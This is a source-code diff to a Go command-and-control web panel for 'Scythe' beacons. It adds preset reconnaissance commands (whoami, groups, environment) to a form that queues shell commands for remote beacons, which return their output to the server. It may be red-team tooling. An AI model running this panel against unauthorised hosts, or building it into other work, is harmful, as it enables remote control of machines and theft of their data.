@@ -22,6 +22,9 @@ const maxQueuedCommandLen = 8000
 // beaconSelfDestructCommand is queued for Scythe to exit on next heartbeat delivery.
 const beaconSelfDestructCommand = "sendmetojesusdog"
 
+// ScytheBuiltinCommands are single-token commands handled by Scythe’s HTTP beacon built-ins (queue exactly as shown).
+var ScytheBuiltinCommands = []string{"whoami", "groups", "environment"}
+
 func beaconSelectLabel(c dbconnections.BeaconClientDocument) string {
 	label := strings.TrimSpace(c.BeaconLabel)
 	if label == "" {
@@ -58,16 +61,28 @@ func (s *Server) handleCommandsPage(w http.ResponseWriter, r *http.Request) {
 	if opts.Len() == 0 {
 		opts.WriteString(`<option value="">(no beacons — generate one under Beacons)</option>`)
 	}
+	var builtinOpts strings.Builder
+	builtinOpts.WriteString(`<option value="">— Custom command below —</option>`)
+	for _, b := range ScytheBuiltinCommands {
+		builtinOpts.WriteString(`<option value="`)
+		builtinOpts.WriteString(template.HTMLEscapeString(b))
+		builtinOpts.WriteString(`">`)
+		builtinOpts.WriteString(template.HTMLEscapeString(b))
+		builtinOpts.WriteString(`</option>`)
+	}
 
 	body := `
 <h1>Beacon commands</h1>
-<p class="muted">Queue shell-style commands for a beacon. They are returned on the next <code>GET /heartbeat/&lt;uuid&gt;</code> and cleared when delivered (same as the <code>Commands</code> array on the client document). When the beacon posts results to <code>POST /receive/&lt;uuid&gt;</code>, output is stored below for review.</p>
+<p class="muted">Queue commands for a beacon. They are returned on the next <code>GET /heartbeat/&lt;uuid&gt;</code> and cleared when delivered (same as the <code>Commands</code> array on the client document). When the beacon posts results to <code>POST /receive/&lt;uuid&gt;</code>, output is stored below for review. <strong>Scythe</strong> supports built-in commands (<code>whoami</code>, <code>groups</code>, <code>environment</code>) — use the preset dropdown or type any shell-style command.</p>
 <div class="card">
   <h2>Queue a command</h2>
   <label>Beacon</label>
   <select id="beaconSel">` + opts.String() + `</select>
+  <label>Scythe built-in (optional)</label>
+  <select id="cmdPreset">` + builtinOpts.String() + `</select>
+  <p class="muted" style="font-size:.85rem;margin:.35rem 0 0">Choosing a built-in fills the command field; you can still edit it before queueing.</p>
   <label>Command</label>
-  <textarea id="cmdText" placeholder="e.g. whoami" rows="4"></textarea>
+  <textarea id="cmdText" placeholder="e.g. whoami, or use built-in preset above" rows="4"></textarea>
   <button type="button" class="btn" id="queueBtn">Queue command</button>
   <p id="cmdMsg" class="muted" style="margin-top:.75rem"></p>
 </div>
@@ -93,7 +108,7 @@ function renderPending(data) {
     el.innerHTML = '<p class="muted">No beacons registered.</p>';
     return;
   }
-  var html = '<table><thead><tr><th>Beacon</th><th>Client ID</th><th>Pending</th></tr></thead><tbody>';
+  var html = '<table><thead><tr><th>Beacon</th><th>Client ID</th><th>Pending commands</th></tr></thead><tbody>';
   for (var i = 0; i < data.beacons.length; i++) {
     var b = data.beacons[i];
     var pend = (b.pending && b.pending.length) ? b.pending.map(function(c) { return escapeHtml(c); }).join('<br>') : '<span class="muted">—</span>';
@@ -113,6 +128,10 @@ async function loadPending() {
   if (!r.ok) { document.getElementById('pendingWrap').innerHTML = '<p class="muted">' + (j.error || r.statusText) + '</p>'; return; }
   renderPending(j);
 }
+document.getElementById('cmdPreset').onchange = function() {
+  var v = document.getElementById('cmdPreset').value;
+  if (v) { document.getElementById('cmdText').value = v; }
+};
 document.getElementById('queueBtn').onclick = async function() {
   var sel = document.getElementById('beaconSel');
   var cid = sel.value;
@@ -120,12 +139,13 @@ document.getElementById('queueBtn').onclick = async function() {
   msg.textContent = '';
   if (!cid) { msg.textContent = 'Select a beacon.'; return; }
   var cmd = document.getElementById('cmdText').value;
-  if (!cmd.trim()) { msg.textContent = 'Enter a command.'; return; }
+  if (!cmd.trim()) { msg.textContent = 'Enter a command or choose a built-in preset.'; return; }
   var r = await fetch('/api/beacon-commands', { method: 'POST', credentials: 'same-origin', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ client_id: cid, command: cmd }) });
   var j = await r.json().catch(function() { return {}; });
   if (r.ok) {
     msg.textContent = 'Queued.';
     document.getElementById('cmdText').value = '';
+    document.getElementById('cmdPreset').value = '';
     loadPending();
     if (document.getElementById('histSel').value === cid) { loadCommandHistory(); }
   } else {
